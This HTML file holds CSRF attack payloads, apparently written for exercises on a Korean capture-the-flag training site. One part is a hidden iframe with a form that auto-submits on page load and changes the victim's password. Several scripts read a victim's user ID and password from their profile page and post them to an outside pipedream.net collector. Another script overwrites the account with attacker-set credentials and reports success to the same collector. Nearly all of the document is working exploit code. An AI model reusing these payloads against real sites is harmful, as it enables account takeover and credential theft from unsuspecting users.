<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<iframe width="0" height="0" frameborder="0" name="stealthcsrf" id="stealthcsrf" style="display: none"></iframe>
<body onload="document.forms[0].submit()">
    <div width="0" height="0" style="display: none">
        <form method="post" action="http://ctf.segfaulthub.com:7777/csrf_1/mypage_update.php" target="stealthcsrf">
            <input name="pw" type="hidden" value="csrf" />
            <input type="submit" value="Update" />
        </form>
    </div>
</body>
</html>

<!-- 1차 프로젝트 CSRF -->
<script>
    async function csrfExploit() {
        try {
            let url = "http://ctf.segfaulthub.com:5004/study/board_like_ok.php?idx=496";
            let response = await fetch(url);
            document.location.href="http://ctf.segfaulthub.com:5004/file/upload/login.html";
        } catch (error) {
            let attackerUrl = "https://eodhhttu9beaqkb.m.pipedream.net?error=" + error;
            await fetch(attackerUrl);
        }
    }

    csrfExploit();
</script>

<!-- 2차 프로젝트 정보누출 CSRF -->
<script>
    async function csrfExploit() {
        let url = "http://ctf.segfaulthub.com:5005/login%20case%201/board/mypage_mod.php";
        let response = await fetch(url);
        let html = await response.text();
        let parser = new DOMParser();
        let dom = parser.parseFromString(html, "text/html");
        let userid = dom.forms[0].userid.placeholder;
        let pw = dom.forms[0].pw.placeholder;
        let attackerUrl = "https://eobws14x5y95evd.m.pipedream.net";
        await fetch(attackerUrl, { method: "POST", body: new URLSearchParams({ userid, pw }) });
    }

    csrfExploit();
</script>

<!-- 2차 프로젝트 CSRF -->
<script>
    async function csrfExploit() {
        let url = "http://ctf.segfaulthub.com:5005/login%20case%201/board/mypage_mod.php";
        let response = await fetch(url);
        let html = await response.text();
        let parser = new DOMParser();
        let dom = parser.parseFromString(html, "text/html");
        let userid = "attacker";
        let pw = "attack";
        let name = dom.forms[0].name.placeholder;
        let adress = dom.forms[0].adress.placeholder;
        let sex = "남";
        let email = "test@naver.com";
        let attackerUrl = "http://ctf.segfaulthub.com:5005/login case 1/board/mypage_mod_ok.php";
        let resp = await fetch(attackerUrl, { 
            method: "POST", 
            body: new URLSearchParams({ userid, pw, name, adress, sex, email }) });
        if (resp.ok) {
            await fetch("https://eobws14x5y95evd.m.pipedream.net/?result=succuess");
        }
    }
    csrfExploit();
</script>




